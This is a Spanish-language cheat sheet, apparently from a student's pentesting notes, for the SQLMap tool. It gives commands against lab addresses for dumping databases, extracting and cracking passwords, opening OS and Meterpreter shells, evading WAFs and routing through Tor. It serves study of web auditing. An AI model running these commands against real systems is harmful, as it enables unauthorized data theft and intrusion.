# SQLMap — Cheat Sheet

> Inyección SQL automatizada.

---

## Sintaxis básica

```bash
sqlmap -u <URL>
sqlmap -r <request.txt>
```

## Uso básico

```bash
sqlmap -u "http://10.10.10.x/page?id=1"
sqlmap -u "http://10.10.10.x/page?id=1" --dbs
sqlmap -u "http://10.10.10.x/page?id=1" -D <db> --tables
sqlmap -u "http://10.10.10.x/page?id=1" -D <db> -T <table> --dump
```

## Desde request HTTP

```bash
# Guardar request en archivo (desde Burp)
sqlmap -r request.txt
sqlmap -r request.txt --batch
```

## Bases de datos

```bash
--dbs                              # Listar bases de datos
-D <db> --tables                   # Listar tablas
-D <db> -T <table> --columns       # Listar columnas
-D <db> -T <table> --dump          # Dump completo
-D <db> -T <table> -C <cols> --dump  # Columnas específicas
```

## Usuarios y passwords

```bash
--users                            # Listar usuarios
--passwords                        # Crackear passwords
--privileges                       # Listar privilegios
--is-dba                           # ¿Es DBA?
```

## Shell

```bash
--os-shell                         # Shell del SO
--os-pwn                           # Meterpreter
--sql-shell                        # Shell SQL
```

## Bypass de WAF

```bash
--tamper=space2comment              # Evadir WAF
--tamper=charencode                # Codificar caracteres
--random-agent                     # User-Agent aleatorio
--delay=1                          # Delay entre requests
--threads=1                        # Un hilo
```

## Opciones útiles

```bash
--batch                            # Respuestas automáticas
--level=5                          # Nivel de testing (1-5)
--risk=3                           # Riesgo (1-3)
--technique=BEUST                  # Técnicas a usar
--proxy=<proxy>                    # Proxy
--tor                              # Tor
--check-tor                       # Verificar Tor
--forms                            # Testear formularios
--crawl=3                          # Crawlear sitio
--output-dir=<dir>                 # Directorio de output
```

## Técnicas SQLi

```bash
--technique=B    # Boolean-based blind
--technique=E    # Error-based
--technique=U    # UNION query
--technique=S    # Stacked queries
--technique=T    # Time-based blind
```

## Ejemplos prácticos

```bash
# Dump completo de una BD
sqlmap -u "http://10.10.10.x/page?id=1" -D testdb --dump

# Shell
sqlmap -u "http://10.10.10.x/page?id=1" --os-shell

# Bypass WAF
sqlmap -u "http://10.10.10.x/page?id=1" --tamper=space2comment --random-agent --batch

# Desde Burp request
sqlmap -r request.txt --level=5 --risk=3 --batch
```


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[BurpSuite.md|BurpSuite]] — Burp Suite, Redes
- [[../../README.md|README]] — Burp Suite, SQL Injection, SQLMap
- [[../../apuntes Andres/15.07.2026 IA Introducción y Vibe Coding.md|15.07.2026 IA Introducción y Vibe Coding]] — Redes, SQL Injection, SQLMap
- [[../../apuntes Andres/23.07.2026 IA De los cimientos a la Cima- LLMs, Tokens, Claude Code y Arquitectura de Agentes.md|23.07.2026 IA De los cimientos a la Cima- LLMs, Tokens, Claude Code y Arquitectura de Agentes]] — Burp Suite, SQL Injection, SQLMap
- [[../../apuntes Andres/22.07.2026 IA Redes Neuronales, Machine Learning y Arquitecturas de Conocimiento.md|22.07.2026 IA Redes Neuronales, Machine Learning y Arquitecturas de Conocimiento]] — Redes, SQL Injection
- [[../../apuntes Joselu/MODULO3/resumen_master_clase50.md|resumen_master_clase50]] — Redes, SQL Injection

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/SQLMap|SQLMap]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]

> #burpsuite #redes #sqli #sqlmap
